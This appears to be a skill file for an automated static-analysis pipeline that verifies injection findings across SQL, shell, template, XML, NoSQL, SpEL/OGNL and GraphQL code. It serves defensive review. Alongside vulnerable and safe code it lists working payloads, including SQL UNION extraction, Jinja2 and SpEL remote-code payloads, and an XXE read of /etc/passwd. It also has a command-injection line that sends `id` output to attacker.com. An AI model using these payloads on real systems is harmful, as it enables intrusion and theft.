# Injection Skill — flow-sast Phase 4

Scope: sqli, nosqli, command injection (rce), ssti, xxe, xpath injection,
ldap injection, expression injection (SpEL/EL/OGNL), graphql injection, log injection.

**Primary input (Phase 3 Verify)**:
- Verified path from `connect/joern_annotated_paths.json`:
  - `path.entry` — entry point file:line
  - `path.sink` — sink name + file
  - `path.flow_nodes[]` — Joern call chain; read to identify custom sanitizers not in known list
  - `path.vuln_type` — drives which section to use
  - `path.path_decision` — verify depth (`confirmed` / `full_verify` / `sanitizer` / etc.)

**Supplementary context (catalog/connect)**:
- `catalog/sources.json` + `catalog/sinks.json` — semgrep taint pairs for broader context
- `catalog/repo_structure.json` → `custom_sinks[]` — gitnexus HIGH/MEDIUM confidence custom sinks (rawExec, customQuery…)
- `catalog/business_ctx.json` → `sensitive_flows` — which injection paths are business-critical
- `catalog/repo_intel.json` → `framework_detection` — framework context for bypass assessment

---

## 1. SQL Injection (sqli)

**VULNERABLE** — user input concatenated/interpolated into query:
```python
cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")   # Python f-string
db.query(`SELECT * FROM orders WHERE status = '${status}'`)      # Node template literal
User.objects.raw(f"SELECT * WHERE name='{name}'")                # Django raw()
DB::statement("SELECT * FROM logs WHERE user = '$user'")         # Laravel raw
jdbcTemplate.query("SELECT * WHERE id = '" + id + "'", mapper)   # Java concat
```

**SAFE** — parameterized / ORM:
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
User.objects.filter(id=user_id)
pool.query("SELECT * WHERE id = $1", [userId])
User::where('id', $id)->first()
```

**Verify from flow_nodes**: look for string concat (`+`, `.`, f-string) between source and query execution call. ORM `.filter()` / `.where(col: val)` / `.findOne()` = safe.

**Bypasses**:
- `addslashes()` / `mysql_real_escape_string()` → bypass with GBK/BIG5 encoding
- `intval()` → safe only for integer context, not LIKE/MATCH
- ORM `.toSql()` result passed back into raw() → bypasses ORM protection
- Second-order: value stored then re-used in later raw query

**Payloads**:
```
' OR 1=1--
' UNION SELECT null,username,password FROM users--
' AND SLEEP(5)--          (blind time-based)
' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables--
```

**Impact**: data exfil, auth bypass, data modification, RCE via xp_cmdshell/UDF.

---

## 2. Command Injection / RCE

**VULNERABLE**:
```php
exec("ffmpeg -i " . $_POST['filename']);          // no escapeshellarg
shell_exec("ping " . $ip);
system("convert " . $file . " output.pdf");
```
```python
os.system(f"unzip {filename}")                    # shell=False would still be bad here
subprocess.run(f"ls {path}", shell=True)          # shell=True + user input = RCE
```
```js
exec(`git clone ${url}`)
spawn('bash', ['-c', userInput])
```

**SAFE**:
```python
subprocess.run(["unzip", filename])               # array form, no shell
subprocess.run(["ffmpeg", "-i", filename])
```
```php
exec("ffmpeg -i " . escapeshellarg($filename));   // wrapped
```

**Verify from flow_nodes**: check if `shell=True` present (Python), or string concat before `exec/system/spawn`. Array-form subprocess = safe.

**Bypasses**:
- `escapeshellcmd()` only, not `escapeshellarg()` → attacker can inject flags
- Whitelist prefix check `startswith('/safe/')` → bypass with `/safe/../etc/passwd`
- Input via env variable → `$IFS`, `${IFS}` bypass spaces

**Payloads**:
```
; id
| whoami
`id`
$(cat /etc/passwd)
%0a id                    (URL-encoded newline)
file.jpg; curl attacker.com/$(id)
```

---

## 3. SSTI (Server-Side Template Injection)

**VULNERABLE**:
```python
render_template_string(f"Hello {name}")           # user data before render
render_template_string(template)                  # user-controlled template string
```
```php
$twig->render($userInput, [])                     # user controls template
```

**SAFE**:
```python
render_template('page.html', name=name)           # static template, data as context
```

**Verify from flow_nodes**: user input passed as first argument to render function, not as named variable in context dict.

**Detection payloads** (check if math evaluates):
```
{{7*7}}          → 49 = Jinja2/Twig
${7*7}           → 49 = Freemarker/Thymeleaf
<%= 7*7 %>       → 49 = ERB
#{7*7}           → 49 = Slim
```

**RCE payloads** (Jinja2):
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
```

---

## 4. XXE (XML External Entity)

**VULNERABLE**:
```php
$dom = new DOMDocument();
$dom->loadXML($userInput);                        // external entities enabled by default
simplexml_load_string($userInput);
```
```python
from lxml import etree
etree.fromstring(userInput)                       // resolve_entities=True default
```

**SAFE**:
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
etree.fromstring(data, parser)
```
```php
libxml_disable_entity_loader(true);
```

**Verify from flow_nodes**: XML parse call receives user input directly without entity-disabled parser.

**Payload** (file read):
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
**Payload** (SSRF via XXE):
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

---

## 5. NoSQL Injection

**VULNERABLE**:
```js
db.users.find({ username: req.body.username })    // object injection: {$gt: ""}
db.users.find({ $where: `this.name == '${name}'` })
```
```python
collection.find({"user": request.json["user"]})   // if user sends {"$gt": ""}
```

**Verify**: user input inserted directly as MongoDB query object without type check. `$where` with string interpolation = always vulnerable.

**Payloads**:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}   // auth bypass
{"username": {"$regex": ".*"}}                        // wildcard match
{"$where": "sleep(5000)"}                             // DoS/blind
```

---

## 6. Expression Injection (SpEL / EL / OGNL)

**VULNERABLE**:
```java
// Spring SpEL
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(userInput).getValue();          // RCE

// Struts OGNL
ognl.Ognl.getValue(userInput, context, root);
```

**SAFE**: use `SimpleEvaluationContext` (SpEL) which disables reflection/method invocation.

**Payload** (SpEL RCE):
```
T(java.lang.Runtime).getRuntime().exec('id')
T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream(),T(java.nio.charset.Charset).forName("UTF-8"))
```

---

## 7. GraphQL Injection

**VULNERABLE**:
```js
const query = `{ user(id: ${req.body.id}) { name email } }`    // interpolated
graphqlClient.query(query)
```

**SAFE**: use variables mechanism — never string-interpolate into GraphQL query.

**Payloads** (introspection + data extraction):
```graphql
{ __schema { types { name fields { name } } } }
{ user(id: "1\") { id } }
```

**Also check**: batching attacks (many queries in one request), deeply nested queries for DoS.

---

## Confidence Calibration

| Scenario | Confidence |
|---|---|
| User input → string concat → query execution | HIGH |
| User input → parameterized query | FALSE POSITIVE |
| `escapeshellarg()` wrapping full input | MED — check bypass |
| `shell=True` + user input | HIGH |
| User controls template string (not context var) | HIGH |
| XML parsed with no entity-disabled parser | HIGH |
| ORM `.filter(col=val)` / `.where(col: val)` | FALSE POSITIVE |
| `intval()` in numeric-only SQL fragment | LOW (safe) |
